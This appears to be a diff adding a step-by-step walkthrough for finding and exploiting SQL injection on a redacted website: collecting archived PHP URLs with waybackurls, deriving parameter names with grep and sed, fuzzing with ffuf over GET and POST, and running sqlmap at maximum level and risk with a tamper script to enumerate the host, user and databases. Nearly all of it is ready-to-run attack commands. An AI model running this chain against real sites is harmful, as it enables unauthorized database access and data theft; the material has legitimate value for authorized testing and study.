@@ -1,0 +1,41 @@
+Step 1:
+waybackurls https://redacted.org/ | uro | grep “.php” > php-files.txt
+
+Step 2:
+grep only lines which contain get string and delete all before it and make it unique to avoid the duplicate.
+cat php-files.txt| grep -i get | sed 's/.*.get//' | sort -u
+
+Step 3:
+.php string to make a list, so I just added the line to the last command cut -f1 -d”.”
+cat php-files.txt| grep -i get | sed 's/.*.get//' | cut -f1 -d"." | sort -u
+
+Step 4:
+If the result words is like CommitmentCountry, CourseMenu etc.. then split these.
+I had contained two words and I don’t know which of them is a parameter, so let’s split it!!!
+cat php-files.txt| grep -i get | sed 's/.*.get//' | cut -f1 -d"."| sed 's/[A-Z]\+/\n&/g' | sort -u
+
+Step 5:
+majority of parameters are lowercase, not uppercase so I’ll keep this as uppercase parameters and convert it to lowercase and I’ll test both of them ;)
+
+we have two lists of parameters let’s test it with FFUF, firstly I’ll grep endpoint and test all params with it.
+ffuf -w lowercase-parameters.txt -u "https://redacted.org/searchProgressCommitment.php?FUZZ=5"
+
+We did'nt get anything, so now change the request method to POST.
+ffuf -w lowercase-parameters.txt -X POST -d "FUZZ=5" -u "https://redacted.org/searchProgressCommitment.php"
+
+got commitment & id parameters as a result.!!!!
+
+
+Step 6:
+Ok now go to the endpoint and intercept the request with burp and change the request method, add the parameter, and copy it to a txt file to run sqlmap on it.
+
+sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast
+
+SQLI SUCCESS!!!
+-----------------------------------------------------------------------------------
+
+
+
+Reference:
+https://infosecwriteups.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-2824cd4dfab
+https://github.com/lutfumertceylan/top25-parameter/blob/master/SQLi-parameters.txt
